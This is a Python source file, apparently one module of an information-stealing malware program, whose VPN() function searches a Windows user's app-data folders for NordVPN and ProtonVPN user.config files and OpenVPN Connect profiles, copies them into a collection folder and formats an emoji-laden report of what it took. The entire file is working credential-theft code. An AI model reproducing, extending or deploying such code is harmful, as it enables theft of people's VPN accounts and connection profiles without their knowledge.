from os import environ, listdir, mkdir
from os.path import exists, join
from glob import glob
from shutil import copy
from manager.logger import Log
from preferences.config import config

def VPN():
    data= ""
    data += "\n\n\n<b>📡VPN📡</b>"
    Log("===========VPN===========")
    local = environ["LOCALAPPDATA"]
    appdata = environ["APPDATA"]

    directory = {
        'Nord VPN': local + '\\NordVPN\\',
        'Open VPN': appdata + '\\OpenVPN Connect\\profiles\\',
        'Proton VPN': local + '\\ProtonVPN\\'
    }
    
    logs = {}
    for key, value in directory.items():
        try:
            if exists(value):
                if key == 'Nord VPN':
                    logs[key] = ''.join(glob(value+"\\NordVPN.exe*"))+'\\'+listdir(''.join(glob(value+"\\NordVPN.exe*")))[0] + '\\user.config'
                if key == 'Open VPN':
                    logs[key] = value+listdir(value)[0]
                if key == 'Proton VPN':
                    logs[key] = ''.join(glob(value+"\\ProtonVPN.exe*"))+'\\'+listdir(''.join(glob(value+"\\ProtonVPN.exe*")))[0] + '\\user.config'
        except Exception as e:
            Log(f"VPN({key}) ---> {e}")

    
    if logs:
        try:
            pathToLogs = join(config.pathToLogs, "VPN")
            mkdir(pathToLogs)
            for key, value in logs.items():
                mkdir(join(pathToLogs, key))
                copy(value, join(pathToLogs, key))
                data += f"\n∟⛓{key}"
        except Exception as e:
            Log(f"VPN(write) ---> {e}")

    return data